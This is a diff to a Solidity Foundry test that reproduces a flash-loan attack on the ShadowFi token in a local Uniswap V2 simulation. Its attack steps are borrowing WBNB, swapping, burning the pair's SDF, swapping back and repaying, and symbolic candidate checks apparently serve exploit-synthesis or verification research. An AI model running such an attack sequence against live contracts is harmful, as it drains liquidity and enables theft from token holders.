@@ -1,5 +1,6 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
+import "./AttackContract.sol";
 import "./ShadowFi.sol";
 import "@utils/QueryBlockchain.sol";
 import "forge-std/Test.sol";
@@ -14,13 +15,15 @@ contract ShadowFiTest is Test, BlockLoader {
     UniswapV2Pair pair;
     UniswapV2Factory factory;
     UniswapV2Router router;
+    AttackContract attackContract;
+    address owner;
     address attacker;
-    address owner = address(0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266);
     address sdfAddr;
     address wbnbAddr;
     address pairAddr;
     address factoryAddr;
     address routerAddr;
+    address attackContractAddr;
     uint256 blockTimestamp = 1662087759;
     uint112 reserve0pair = 10354946297404462;
     uint112 reserve1pair = 1078615699417903036883;
@@ -39,9 +42,7 @@ contract ShadowFiTest is Test, BlockLoader {
     uint256 balanceOfwbnb = 29524049518234847547;
 
     function setUp() public {
-        vm.warp(blockTimestamp);
-        attacker = address(this);
-        vm.startPrank(owner);
+        owner = address(this);
         sdf = new ShadowFi(1662075000);
         sdfAddr = address(sdf);
         wbnb = new WBNB();
@@ -66,14 +67,16 @@ contract ShadowFiTest is Test, BlockLoader {
         factoryAddr = address(factory);
         router = new UniswapV2Router(address(factory), address(0xdead));
         routerAddr = address(router);
+        attackContract = new AttackContract();
+        attackContractAddr = address(attackContract);
+        attacker = address(attackContract);
         sdf.afterDeploy(address(router), address(pair));
         // Initialize balances and mock flashloan.
         wbnb.transfer(address(pair), balanceOfwbnbpair);
         sdf.transfer(address(pair), balanceOfsdfpair);
-        wbnb.transfer(attacker, balanceOfwbnbattacker);
+        wbnb.transfer(address(attackContract), balanceOfwbnbattacker);
         wbnb.approve(attacker, UINT256_MAX);
         sdf.approve(attacker, UINT256_MAX);
-        vm.stopPrank();
     }
 
     function printBalance(string memory tips) public {
@@ -98,9 +101,17 @@ contract ShadowFiTest is Test, BlockLoader {
         );
         queryERC20BalanceDecimals(address(sdf), address(pair), sdf.decimals());
         emit log_string("");
-        emit log_string("Attacker Balances: ");
-        queryERC20BalanceDecimals(address(wbnb), attacker, wbnb.decimals());
-        queryERC20BalanceDecimals(address(sdf), attacker, sdf.decimals());
+        emit log_string("Attackcontract Balances: ");
+        queryERC20BalanceDecimals(
+            address(wbnb),
+            address(attackContract),
+            wbnb.decimals()
+        );
+        queryERC20BalanceDecimals(
+            address(sdf),
+            address(attackContract),
+            sdf.decimals()
+        );
         emit log_string("");
         emit log_string("");
         emit log_string("");
@@ -167,6 +178,8 @@ contract ShadowFiTest is Test, BlockLoader {
     }
 
     function test_gt() public {
+        vm.startPrank(attacker);
+        vm.warp(blockTimestamp);
         borrow_wbnb(1e16);
         printBalance("After step0 ");
         swap_pair_wbnb_sdf(1e16);
@@ -180,6 +193,7 @@ contract ShadowFiTest is Test, BlockLoader {
         payback_wbnb(1.003e16);
         printBalance("After step5 ");
         require(attackGoal(), "Attack failed!");
+        vm.stopPrank();
     }
 
     function check_gt(
@@ -189,7 +203,9 @@ contract ShadowFiTest is Test, BlockLoader {
         uint256 amt3,
         uint256 amt4
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt4 == (amt0 * 1003) / 1000);
+        vm.warp(blockTimestamp);
         borrow_wbnb(amt0);
         swap_pair_wbnb_sdf(amt1);
         burn_pair_sdf(amt2);
@@ -197,6 +213,7 @@ contract ShadowFiTest is Test, BlockLoader {
         swap_pair_sdf_wbnb(amt3);
         payback_wbnb(amt4);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 
     function check_cand000(
@@ -206,13 +223,16 @@ contract ShadowFiTest is Test, BlockLoader {
         uint256 amt3,
         uint256 amt4
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt4 == (amt0 * 1003) / 1000);
+        vm.warp(blockTimestamp);
         borrow_wbnb(amt0);
         swap_pair_wbnb_sdf(amt1);
         burn_pair_sdf(amt2);
         swap_pair_sdf_wbnb(amt3);
         payback_wbnb(amt4);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 
     function check_cand001(
@@ -223,7 +243,9 @@ contract ShadowFiTest is Test, BlockLoader {
         uint256 amt4,
         uint256 amt5
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt5 == (amt0 * 1003) / 1000);
+        vm.warp(blockTimestamp);
         borrow_wbnb(amt0);
         swap_pair_wbnb_sdf(amt1);
         burn_pair_sdf(amt2);
@@ -231,6 +253,7 @@ contract ShadowFiTest is Test, BlockLoader {
         swap_pair_sdf_wbnb(amt4);
         payback_wbnb(amt5);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 
     function check_cand002(
@@ -240,7 +263,9 @@ contract ShadowFiTest is Test, BlockLoader {
         uint256 amt3,
         uint256 amt4
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt4 == (amt0 * 1003) / 1000);
+        vm.warp(blockTimestamp);
         borrow_wbnb(amt0);
         swap_pair_wbnb_sdf(amt1);
         burn_pair_sdf(amt2);
@@ -248,6 +273,7 @@ contract ShadowFiTest is Test, BlockLoader {
         swap_pair_sdf_wbnb(amt3);
         payback_wbnb(amt4);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 
     function check_cand003(
@@ -258,7 +284,9 @@ contract ShadowFiTest is Test, BlockLoader {
         uint256 amt4,
         uint256 amt5
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt5 == (amt0 * 1003) / 1000);
+        vm.warp(blockTimestamp);
         borrow_wbnb(amt0);
         swap_pair_wbnb_sdf(amt1);
         burn_pair_sdf(amt2);
@@ -266,6 +294,7 @@ contract ShadowFiTest is Test, BlockLoader {
         swap_pair_sdf_wbnb(amt4);
         payback_wbnb(amt5);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 
     function check_cand004(
@@ -276,7 +305,9 @@ contract ShadowFiTest is Test, BlockLoader {
         uint256 amt4,
         uint256 amt5
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt5 == (amt0 * 1003) / 1000);
+        vm.warp(blockTimestamp);
         borrow_wbnb(amt0);
         swap_pair_wbnb_sdf(amt1);
         burn_pair_sdf(amt2);
@@ -285,6 +316,7 @@ contract ShadowFiTest is Test, BlockLoader {
         swap_pair_sdf_wbnb(amt4);
         payback_wbnb(amt5);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 
     function check_cand005(
@@ -296,7 +328,9 @@ contract ShadowFiTest is Test, BlockLoader {
         uint256 amt5,
         uint256 amt6
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt6 == (amt0 * 1003) / 1000);
+        vm.warp(blockTimestamp);
         borrow_wbnb(amt0);
         swap_pair_wbnb_sdf(amt1);
         burn_pair_sdf(amt2);
@@ -305,6 +339,7 @@ contract ShadowFiTest is Test, BlockLoader {
         swap_pair_sdf_wbnb(amt5);
         payback_wbnb(amt6);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 
     function check_cand006(
@@ -315,7 +350,9 @@ contract ShadowFiTest is Test, BlockLoader {
         uint256 amt4,
         uint256 amt5
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt5 == (amt0 * 1003) / 1000);
+        vm.warp(blockTimestamp);
         borrow_wbnb(amt0);
         swap_pair_wbnb_sdf(amt1);
         burn_pair_sdf(amt2);
@@ -324,6 +361,7 @@ contract ShadowFiTest is Test, BlockLoader {
         swap_pair_sdf_wbnb(amt4);
         payback_wbnb(amt5);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 
     function check_cand007(
@@ -335,7 +373,9 @@ contract ShadowFiTest is Test, BlockLoader {
         uint256 amt5,
         uint256 amt6
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt6 == (amt0 * 1003) / 1000);
+        vm.warp(blockTimestamp);
         borrow_wbnb(amt0);
         swap_pair_wbnb_sdf(amt1);
         burn_pair_sdf(amt2);
@@ -344,6 +384,7 @@ contract ShadowFiTest is Test, BlockLoader {
         swap_pair_sdf_wbnb(amt5);
         payback_wbnb(amt6);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 
     function check_cand008(
@@ -355,7 +396,9 @@ contract ShadowFiTest is Test, BlockLoader {
         uint256 amt5,
         uint256 amt6
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt6 == (amt0 * 1003) / 1000);
+        vm.warp(blockTimestamp);
         borrow_wbnb(amt0);
         swap_pair_wbnb_sdf(amt1);
         burn_pair_sdf(amt2);
@@ -365,6 +408,7 @@ contract ShadowFiTest is Test, BlockLoader {
         swap_pair_sdf_wbnb(amt5);
         payback_wbnb(amt6);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 
     function check_cand009(
@@ -377,7 +421,9 @@ contract ShadowFiTest is Test, BlockLoader {
         uint256 amt6,
         uint256 amt7
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt7 == (amt0 * 1003) / 1000);
+        vm.warp(blockTimestamp);
         borrow_wbnb(amt0);
         swap_pair_wbnb_sdf(amt1);
         burn_pair_sdf(amt2);
@@ -387,6 +433,7 @@ contract ShadowFiTest is Test, BlockLoader {
         swap_pair_sdf_wbnb(amt6);
         payback_wbnb(amt7);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 
     function check_cand010(
@@ -398,7 +445,9 @@ contract ShadowFiTest is Test, BlockLoader {
         uint256 amt5,
         uint256 amt6
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt6 == (amt0 * 1003) / 1000);
+        vm.warp(blockTimestamp);
         borrow_wbnb(amt0);
         swap_pair_wbnb_sdf(amt1);
         burn_pair_sdf(amt2);
@@ -408,6 +457,7 @@ contract ShadowFiTest is Test, BlockLoader {
         swap_pair_sdf_wbnb(amt5);
         payback_wbnb(amt6);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 
     function check_cand011(
@@ -420,7 +470,9 @@ contract ShadowFiTest is Test, BlockLoader {
         uint256 amt6,
         uint256 amt7
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt7 == (amt0 * 1003) / 1000);
+        vm.warp(blockTimestamp);
         borrow_wbnb(amt0);
         swap_pair_wbnb_sdf(amt1);
         burn_pair_sdf(amt2);
@@ -430,6 +482,7 @@ contract ShadowFiTest is Test, BlockLoader {
         swap_pair_sdf_wbnb(amt6);
         payback_wbnb(amt7);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 
     function check_cand012(
@@ -442,7 +495,9 @@ contract ShadowFiTest is Test, BlockLoader {
         uint256 amt6,
         uint256 amt7
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt7 == (amt0 * 1003) / 1000);
+        vm.warp(blockTimestamp);
         borrow_wbnb(amt0);
         swap_pair_wbnb_sdf(amt1);
         burn_pair_sdf(amt2);
@@ -453,6 +508,7 @@ contract ShadowFiTest is Test, BlockLoader {
         swap_pair_sdf_wbnb(amt6);
         payback_wbnb(amt7);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 
     function check_cand013(
@@ -466,7 +522,9 @@ contract ShadowFiTest is Test, BlockLoader {
         uint256 amt7,
         uint256 amt8
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt8 == (amt0 * 1003) / 1000);
+        vm.warp(blockTimestamp);
         borrow_wbnb(amt0);
         swap_pair_wbnb_sdf(amt1);
         burn_pair_sdf(amt2);
@@ -477,6 +535,7 @@ contract ShadowFiTest is Test, BlockLoader {
         swap_pair_sdf_wbnb(amt7);
         payback_wbnb(amt8);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 
     function check_cand014(
@@ -489,7 +548,9 @@ contract ShadowFiTest is Test, BlockLoader {
         uint256 amt6,
         uint256 amt7
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt7 == (amt0 * 1003) / 1000);
+        vm.warp(blockTimestamp);
         borrow_wbnb(amt0);
         swap_pair_wbnb_sdf(amt1);
         burn_pair_sdf(amt2);
@@ -500,6 +561,7 @@ contract ShadowFiTest is Test, BlockLoader {
         swap_pair_sdf_wbnb(amt6);
         payback_wbnb(amt7);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 
     function check_cand015(
@@ -513,7 +575,9 @@ contract ShadowFiTest is Test, BlockLoader {
         uint256 amt7,
         uint256 amt8
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt8 == (amt0 * 1003) / 1000);
+        vm.warp(blockTimestamp);
         borrow_wbnb(amt0);
         swap_pair_wbnb_sdf(amt1);
         burn_pair_sdf(amt2);
@@ -525,5 +589,6 @@ contract ShadowFiTest is Test, BlockLoader {
         swap_pair_sdf_wbnb(amt7);
         payback_wbnb(amt8);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 }
